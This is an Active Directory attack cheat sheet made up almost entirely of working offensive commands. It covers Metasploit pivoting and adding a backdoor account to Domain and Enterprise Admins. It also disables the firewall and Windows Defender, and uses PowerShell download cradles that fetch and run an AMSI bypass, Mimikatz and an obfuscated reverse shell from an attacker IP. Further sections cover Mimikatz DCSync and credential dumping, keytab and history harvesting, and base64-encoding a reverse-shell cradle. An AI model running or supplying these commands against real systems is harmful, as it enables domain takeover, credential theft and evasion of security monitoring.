# Active-Directory-Breach
### Pivoting
```
use auxiliary/server/socks_proxy
exploit -j

run post/multi/manage/autoroute
set session 1
session => 1
set subnet 172.16.170.0/24
run
```
### RDP
```
net user Evil Password123! /add /domain
net localgroup administrators Evil /add
net localgroup "Remote Desktop Users" Evil /add /domain
net group "domain admins" Evil /add /domain
net group ""Enterprise Admins"" Evil /add /domain

netsh firewall set opmode disable
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0
```
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/amsibypass.txt')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Invoke-PortScan.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/PowerUp.ps1');Invoke-AllChecks
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010//PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/amsibypass.txt')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010//Invoke-Mimikatz.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/PowerUpSQL.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Obfuscated_RevShell.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/Powermad.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.199:1010/SharpHound.ps1');Invoke-BloodHound -collectionMethod All
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```
### Mimikatz
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::tickets"'
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:OPS.COMPLY.com /all"
Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /domain:OPS.COMPLY.com /user:administrator"
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::lsa /patch"'
```

### Host Enumeration
```
sudo -l
ls -al /tmp/
cat .bash_history
cat /etc/resolv.conf
dnsdomainname
hostname -d
cat /etc/ansible/hosts
cat /etc/krb5.conf
ls -lsa /etc/krb5.conf
cat /etc/krb5.conf
ls -lsa /etc/krb5.keytab
find / -name *.keytab*
ls /tmp/ | grep krb5cc

systeminfo | findstr /B "Domain"
wmic group where name="Domain Admins" get name,sid,domain
wmic path win32_computersystem get domain
reg query "HKLM\System\CurrentControlSet\Services\Tcpip\Parameters" /v "Domain"

Get-MpComputerStatus
icacls C:\Windows\Tasks
(Get-WmiObject Win32_ComputerSystem).Domain
systeminfo | findstr /B /C:"Domain"

Set-MpPreference -DisableRealtimeMonitoring $true
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

NetSh Advfirewall set allprofiles state off
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct  Get displayName,timestamp /Format:List

wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname, ds_samaccountname 

```


### Encoding
```
$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.194:1010/Obfuscated_RevShell.ps1') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
```
